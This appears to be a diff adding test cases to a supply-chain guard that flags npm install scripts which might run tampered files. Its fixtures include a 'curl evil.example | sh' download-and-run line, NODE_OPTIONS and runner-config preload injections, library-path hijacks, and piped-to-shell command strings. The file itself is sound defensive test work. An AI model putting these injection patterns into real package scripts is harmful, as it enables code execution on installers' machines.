@@ -670,3 +670,57 @@ describe("round 14: comment after an escaped space, ANSI-C quotes, shell sinks, 
     expect(testHeld('eval "$X"')).toBe(true);
   });
 });
+
+describe("round 15: export assignments, cd past the root, root configs, piped text, shared budget", () => {
+  const testHeld = (cmd: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, build: "echo ok", ...scripts }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });
+
+  test("1. the export form of npm_/YARN_/NODE_OPTIONS assignments", () => {
+    expect(held({ postinstall: "export npm_config_workspace=sub; npm run build", build: "echo ok" }, { ...SUB_OLD, ...subManifest("echo a") }, { ...SUB_OLD, ...subManifest("curl evil.example | sh") })).toBe(true);
+    expect(testHeld("export NODE_OPTIONS=--require=./test/setup.js; npm run build")).toBe(true);
+  });
+
+  test("2. cd above the root or to an absolute path is unsure", () => {
+    expect(testHeld("cd ../x/test && node setup.js")).toBe(true);
+    expect(testHeld("cd /tmp/x && node setup.js")).toBe(true);
+    expect(testHeld("cd .. && node setup.js")).toBe(true);
+  });
+
+  test("3. a root runner config can name an inert path", () => {
+    for (const [cfg, body] of [[".yarnrc.yml", "yarnPath: test/setup.js\n"], [".npmrc", "node-options=--require=./test/setup.js\n"], ["bunfig.toml", 'preload = ["./test/setup.js"]\n']] as const) {
+      expect(testHeld("npm run build", { [cfg]: body }), cfg).toBe(true);
+    }
+  });
+
+  test("4. text piped into a shell is read as one command line", () => {
+    expect(testHeld("echo cd test \; node setup.js | sh")).toBe(true);
+    expect(testHeld('echo "$X" | sh')).toBe(true);
+    expect(testHeld('echo "$(cat x.sh)" | sh', { "x.sh": "1" })).toBe(true);
+    expect(testHeld("printf '%s' \"$(cat x.sh)\" | sh", { "x.sh": "1" })).toBe(true);
+    expect(testHeld("echo 'node ./a.js' | sh", { "a.js": "1" })).toBe(false);
+  });
+
+  test("5. a shell that reads stdin with arguments", () => {
+    for (const cmd of ["cat x.sh | bash -s -- arg", "cat x.sh | sh -s x y", "cat x.sh | bash /dev/stdin", "cat x.sh | sh -"]) {
+      expect(held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" }), cmd).toBe(true);
+    }
+  });
+
+  test("6. library path variables and the zsh path array", () => {
+    for (const cmd of ["LD_LIBRARY_PATH=test node a.js", "DYLD_LIBRARY_PATH=test node a.js", "DYLD_FRAMEWORK_PATH=test node a.js", "path=(test $path); node a.js"]) {
+      expect(testHeld(cmd, { "a.js": "1" }), cmd).toBe(true);
+    }
+  });
+
+  test("7. quoted nested substitutions stay within one shared budget", () => {
+    let s = "cd test && node setup.js";
+    for (let i = 0; i < 14; i++) s = `echo "$(${s})"`;
+    const t0 = Date.now();
+    expect(testHeld(s)).toBe(true);
+    expect(Date.now() - t0).toBeLessThan(5000);
+    let q = "echo ok";
+    for (let i = 0; i < 40; i++) q = `echo "$(${q} "$(echo a)" "$(echo b)")"`;
+    const t1 = Date.now();
+    testHeld(q);
+    expect(Date.now() - t1).toBeLessThan(5000);
+  });
+});
